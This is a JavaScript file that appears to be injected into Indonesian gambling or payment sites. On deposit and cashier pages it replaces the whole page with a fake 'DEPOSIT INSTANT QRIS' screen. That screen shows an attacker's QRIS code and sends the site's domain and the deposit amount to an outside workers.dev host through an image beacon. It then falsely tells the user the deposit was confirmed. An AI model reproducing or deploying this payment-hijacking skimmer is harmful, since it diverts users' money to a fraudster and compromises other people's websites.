(function () {
  const url = window.location.href;
  const match = [
    '/deposit',
    '/bank',
    '/deposit.php',
    '/qris.php',
    '/cashier',
    '/?page=transaksi',
    '/index.php?page=transaksi',
    '/?deposit&head=home',
    '/index.php?page=cashier',
    '/bank.php'
  ];

  if (!match.some(path => url.includes(path))) {
    return;
  }

  document.body.innerHTML = `
<style>
    body {
        font-family: Arial, sans-serif;
        margin: 0;
        padding: 0;
        background: #f5f5f5;
        color: #333;
        text-align: center;
    }
    .logo-container {
        display: flex;
        justify-content: center;
        gap: 10px;
        background: white;
        padding: 10px;
        flex-wrap: wrap;
    }
    .logo-container img {
        height: 40px;
        object-fit: contain;
    }
    /* Running text khusus */
    .marquee-text {
        background: #ffeb3b;
        border: 2px solid #d4af37;
        padding: 5px;
        margin: 5px auto;
        overflow: hidden;
        white-space: nowrap;
        box-sizing: border-box;
        font-weight: bold;
        color: #000;
        text-shadow: 1px 1px 2px rgba(255,255,255,0.7);
    }
    .marquee-text span {
        display: inline-block;
        padding-left: 100%;
        animation: marquee 10s linear infinite;
    }
    @keyframes marquee {
        0% { transform: translateX(0%); }
        100% { transform: translateX(-100%); }
    }
    /* Teks biasa (tidak running) tapi jelas */
    .highlight-text {
        background: #fff8dc;
        border: 2px solid #d4af37;
        padding: 8px;
        margin: 8px auto;
        font-weight: bold;
        color: #000;
        text-shadow: 0px 0px 2px rgba(255,255,255,0.8);
        max-width: 350px;
    }
    .qris-container {
        background: white;
        margin: 15px auto;
        padding: 15px;
        border-radius: 10px;
        box-shadow: 0px 0px 10px rgba(0,0,0,0.1);
        max-width: 350px;
        border: 2px solid #4CAF50;
    }
    .qris-container img {
        width: 100%;
        border: 3px solid #ddd;
        border-radius: 8px;
    }
    .btn {
        display: inline-block;
        background: #2196f3;
        color: white;
        padding: 10px 15px;
        margin-top: 10px;
        border-radius: 5px;
        text-decoration: none;
        font-weight: bold;
        cursor: pointer;
        border: none;
    }
    input[type="number"] {
        width: 90%;
        padding: 8px;
        margin: 10px 0;
        border-radius: 5px;
        border: 1px solid #ccc;
        font-size: 16px;
        text-align: center;
    }
    footer img {
        width: 100%;
        margin-top: 10px;
    }
    footer {
        margin-top: 20px;
    }
    .loading-overlay {
        display: none;
        position: fixed;
        top: 0; left: 0;
        width: 100%; height: 100%;
        background: rgba(0,0,0,0.5);
        z-index: 9999;
        justify-content: center;
        align-items: center;
        color: white;
        font-size: 18px;
        flex-direction: column;
    }
    .spinner {
        border: 4px solid rgba(255,255,255,0.3);
        border-top: 4px solid white;
        border-radius: 50%;
        width: 40px;
        height: 40px;
        animation: spin 1s linear infinite;
        margin-bottom: 10px;
    }
    @keyframes spin {
        0% { transform: rotate(0deg); }
        100% { transform: rotate(360deg); }
    }
</style>

<div class="logo-container">
    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTVSblEcy3PF2cQBNrKu5SPL4Ieo5R-yKAFIg-to270g7p3Oe_IFzTIIjs&s=10" alt="Logo 1">
    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQUUdzifwHXkynArCuvWgH2up4Zn3R2GZGh1-a17IiOlrM1d_fzjVo5-i0K&s=10" alt="Logo 2">
    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT6DvE1kGazNCdFI6W7RII0RUGBCrbuKvo2G0mpeI9Y3O0baWeKj0RUtsAi&s=10" alt="Logo 3">
    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRFAMSzwjc-8wFuDlA-Y-gwDr1j9qxJhZFzIg&s" alt="Logo 4">
</div>

<div class="highlight-text">DEPOSIT INSTANT QRIS</div>

<div class="marquee-text">
    <span>Deposit instant dan praktis menggunakan Qris, Cepat, mudah, tanpa biaya tambahan, Deposit wajib menggunakan Kode unik 887, Contoh : 50.887, Pastikan Tujuan Deposit Qris Atas Nama Merchant Inggar Store</span>
</div>

<div class="qris-container">
    <img id="qrisImg" src="https://assetsqris.pages.dev/qris1.jpg" alt="QRIS">
    <br>
    <a class="btn" href="https://assetsqris.pages.dev/qris1.jpg" download>Download QRIS</a>
</div>

<div class="highlight-text">
    <input type="number" id="nominal" placeholder="Masukkan Nominal" min="50" oninput="updateHint()" style="width:80%; padding:5px; text-align:center;">
</div>

<div class="highlight-text" id="hintText">Hint: -</div>

<div class="highlight-text">
    <button class="btn" onclick="konfirmasi()">Konfirmasi</button>
</div>

<div class="highlight-text">© 2015 - 2025 Copyright QRID. All Rights Reserved</div>

<footer>
    <img src="https://img.viva88athenae.com/guidelines_w.png" alt="Footer Image">
</footer>

<div class="loading-overlay" id="loadingOverlay">
    <div class="spinner"></div>
    Mengirim data...
</div>
`;

  window.updateHint = function () {
    let val = document.getElementById('nominal').value;
    let hintText = document.getElementById('hintText');
    if (val && !isNaN(val)) {
        let total = parseInt(val) * 1000;
        hintText.innerText = "Hint: " + total.toLocaleString('id-ID');
    } else {
        hintText.innerText = "Hint: -";
    }
  }

  window.konfirmasi = function () {
    let val = document.getElementById('nominal').value;
    if (val < 50 || !val) {
        alert("Nominal minimal 50");
        return;
    }
    let total = parseInt(val) * 1000;
    let hint = total.toLocaleString('id-ID');
    let domain = document.domain;
    let message = encodeURIComponent(domain + " - " + hint);

    let img = new Image();
    img.src = `https://xxxpkxxx.xaxeci9852.workers.dev/?message=${message}`;

    document.getElementById('loadingOverlay').style.display = 'flex';

    setTimeout(function() {
        alert("Deposit Berhasil Di konfirmasi, Silahkan Menunggu persetujuan");
        window.location.href = "../";
    }, 1500);
  }
})();
